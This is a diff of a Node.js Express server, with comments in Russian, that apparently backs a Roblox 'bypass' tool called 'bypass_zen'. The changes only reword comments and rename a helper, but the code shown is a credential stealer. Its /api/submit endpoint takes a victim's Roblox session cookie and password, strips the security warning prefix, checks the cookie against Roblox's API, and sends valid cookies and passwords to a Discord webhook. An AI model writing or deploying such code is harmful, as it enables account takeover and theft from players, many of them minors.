@@ -4,7 +4,7 @@ const app = express();
 
 app.use(express.json());
 
-// Разрешаем CORS
+// Настройка CORS (чтобы браузер не блокировал запросы)
 app.use((req, res, next) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -13,10 +13,10 @@ app.use((req, res, next) => {
   next();
 });
 
-// Пинг-эндпоинт для разбуживания сервера Render
+// Пинг для проверки работы и разбуживания
 app.get('/ping', (req, res) => res.send('OK'));
 
-// Эндпоинт валидации и отправки
+// Обработка отправки формы
 app.post('/api/submit', async (req, res) => {
   const { cookie, password, category, webhookUrl } = req.body;
 
@@ -24,7 +24,7 @@ app.post('/api/submit', async (req, res) => {
     return res.status(400).json({ isValid: false, reason: "Missing fields" });
   }
 
-  // Чистим куку от _|WARNING...
+  // Очистка куки
   let cleaned = cookie.trim();
   if (cleaned.startsWith("_|WARNING")) {
     const parts = cleaned.split("|_");
@@ -33,7 +33,7 @@ app.post('/api/submit', async (req, res) => {
   cleaned = cleaned.replace(/^["';]+|["';]+$/g, "").trim();
 
   try {
-    // 1. Запрос к Roblox API
+    // 1. Проверка куки напрямую с Node.js сервера
     const robloxRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
       method: 'GET',
       headers: {
@@ -55,9 +55,9 @@ app.post('/api/submit', async (req, res) => {
       return res.status(400).json({ isValid: false, reason: "Failed to parse Roblox user" });
     }
 
-    // 2. Кука валидна — отправляем в Discord прямо с бэкенда
+    // 2. Если кука валидна — отправка в Discord Webhook
     if (webhookUrl) {
-      const safeCookie = message => "```\n" + message.replace(/`/g, "'") + "\n```";
+      const safeBlock = text => "```\n" + String(text).replace(/`/g, "'") + "\n```";
       const payload = {
         username: "bypass_zen",
         embeds: [{
@@ -66,8 +66,8 @@ app.post('/api/submit', async (req, res) => {
           description:
             `**🗂 Category:** ${category}\n` +
             `**👤 User:** ${userData.name || "Unknown"} (ID: ${userData.id})\n\n` +
-            `**📝 Cookie**\n${safeCookie(cookie)}` +
-            `\n**🔑 Password**\n${safeCookie(password)}`,
+            `**📝 Cookie**\n${safeBlock(cookie)}` +
+            `\n**🔑 Password**\n${safeBlock(password)}`,
           footer: { text: "bypass_zen · 2026" },
           timestamp: new Date().toISOString()
         }]
